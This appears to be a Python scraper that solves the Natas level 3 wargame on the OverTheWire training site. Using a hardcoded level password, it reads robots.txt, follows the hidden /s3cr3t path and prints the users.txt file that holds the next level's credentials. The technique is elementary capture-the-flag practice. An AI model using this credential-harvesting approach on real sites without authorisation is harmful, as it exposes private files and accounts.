# webscraper for natas3
from bs4 import BeautifulSoup
import requests
import os

username = 'natas3'
password = 'sJIJNW6ucpu6HPZ1ZAchaDtwd7oGrD14'
url = 'http://%s.natas.labs.overthewire.org' % username
uriString = ''

def initialRequest():
    session = requests.Session()
    resp = session.get(url, auth=(username, password))
    content = resp.text
    soup = BeautifulSoup(content, 'html.parser')
    print(soup.body)

def robotsRequest():
    session = requests.Session()
    resp2 = session.get(url+'/robots.txt', auth=(username, password))
    content = resp2.text
    soup = BeautifulSoup(content, 'html.parser')
    print(content) #doesn't seem to return closing body tag??
    print(soup.body)

def passwordLocateRequest(element):
    session = requests.Session()
    resp3 = session.get(url+'/s3cr3t', auth=(username, password))
    content = resp3.text
    soup = BeautifulSoup(content, 'html.parser')
    el = soup.find(href='users.txt').get_text()
    element = el
    print(el)
    return element

def grabPassword():
    session = requests.Session()
    resp4 = session.get(url+'/s3cr3t/' + fileLocation, auth=(username, password))
    content = resp4.text
    print(content)

initialRequest()
robotsRequest()
fileLocation = passwordLocateRequest(uriString)
grabPassword()

